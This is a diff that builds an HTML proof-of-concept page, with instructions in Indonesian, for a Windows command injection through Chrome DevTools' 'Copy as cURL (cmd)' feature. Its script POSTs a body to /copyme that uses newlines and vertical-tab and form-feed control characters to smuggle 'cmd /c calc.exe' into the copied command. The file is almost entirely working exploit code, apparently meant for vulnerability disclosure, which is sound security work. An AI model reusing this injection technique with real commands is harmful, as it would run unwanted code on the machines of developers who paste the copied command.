@@ -1,15 +1,37 @@
-<script>
-function run() {
-  const payload =
-    "A\ncmd /c calc.exe" +
-    String.fromCharCode(0x0b) +
-    "\ncmd /c calc.exe" +
-    String.fromCharCode(0x0c);
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <title>Chrome DevTools Copy as cURL (cmd) – Windows PoC</title>
+</head>
+<body>
+  <h2>Copy as cURL (cmd) – Windows Command Injection PoC</h2>
+  <p>
+    Klik tombol di bawah, lalu buka DevTools → Network → request <code>copyme</code>.
+  </p>
 
-  fetch("/copyme", {
-    method: "POST",
-    headers: { "Content-Type": "text/plain" },
-    body: payload
-  });
-}
-</script>
+  <button onclick="run()">Send PoC Request</button>
+
+  <script>
+    function run() {
+      // IMPORTANT:
+      // VT = 0x0b, FF = 0x0c (raw control characters)
+      const payload =
+        "A\ncmd /c calc.exe" +
+        String.fromCharCode(0x0b) +
+        "\ncmd /c calc.exe" +
+        String.fromCharCode(0x0c);
+
+      fetch("/copyme", {
+        method: "POST",
+        headers: {
+          "Content-Type": "text/plain"
+        },
+        body: payload
+      });
+
+      alert("Request sent. Check DevTools → Network → copyme");
+    }
+  </script>
+</body>
+</html>
